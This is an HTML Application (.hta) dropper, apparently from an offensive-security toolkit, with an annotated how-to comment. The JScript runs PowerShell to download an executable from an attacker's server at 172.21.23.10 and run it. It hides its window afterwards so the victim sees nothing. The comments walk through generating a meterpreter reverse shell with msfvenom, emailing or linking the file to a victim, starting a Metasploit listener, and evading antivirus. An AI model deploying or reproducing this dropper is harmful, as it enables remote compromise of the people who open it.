<html>
<!--
============================================================
HTA (HTML Application) Dropper
============================================================
WHAT THIS IS:
  An HTML Application (.hta file) that runs as a trusted Windows
  application via mshta.exe. Unlike regular HTML, HTAs have full
  access to ActiveX objects including WScript.Shell.

WHAT THIS DOES:
  Uses WScript.Shell.Run() to execute PowerShell, which:
    1. Downloads your payload binary from your Kali server
    2. Saves it to C:\Users\Public\runner.exe (always writable)
    3. Executes it

HOW TO USE:
  1. Generate payload:
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f exe -o runner.exe

  2. Host payload and this HTA:
     python3 -m http.server 80

  3. Change IP addresses below to your Kali IP

  4. Send link to victim: http://<KALI_IP>/clickme.hta
     Or: email the file directly

  5. Start Metasploit listener:
     use exploit/multi/handler
     set PAYLOAD windows/x64/meterpreter/reverse_tcp
     set LHOST <IP>; set LPORT 443; run

WHEN VICTIM OPENS:
  - mshta.exe is invoked (trusted Windows binary)
  - JScript in <head> fires immediately
  - Shell.Run() executes two PS commands (iwr and wget as fallback)
  - Window closes (self.close())

NOTES:
  - runner.exe on disk will likely be caught by Defender
  - For AV evasion: use an encrypted loader instead (03-loaders/shellcode-runners/clrunner.cs)
  - The self.close() hides the HTA window after running
  - Two run commands = belt-and-suspenders for PS download methods
============================================================
-->
<head>
<script language="JScript">

// Create a WScript.Shell object — allows running commands as the user
var shell = new ActiveXObject("WScript.Shell");

// Method 1: iwr (Invoke-WebRequest) — modern PS cmdlet
// Downloads runner.exe from attacker and executes it
// CHANGE: 172.21.23.10 → your Kali IP
var res = shell.Run(
    "powershell.exe iwr -uri http://172.21.23.10/inj_runner.exe " +
    "-outfile C:\\users\\public\\runner.exe; " +
    "C:\\users\\public\\runner.exe"
);

// Method 2: wget (PS alias for Invoke-WebRequest) — fallback
// Same download/execute but using the wget alias (sometimes works differently)
var ress = shell.Run(
    "powershell.exe wget http://172.21.23.10/inj_runner.exe " +
    "-o C:\\users\\public\\runner.exe; " +
    "C:\\users\\public\\runner.exe"
);

</script>
</head>
<body>
<script language="JScript">

// Close the HTA window immediately after running the payload
// This prevents the victim from seeing an empty window and
// makes the execution appear as if nothing happened
self.close();

</script>
</body>
</html>
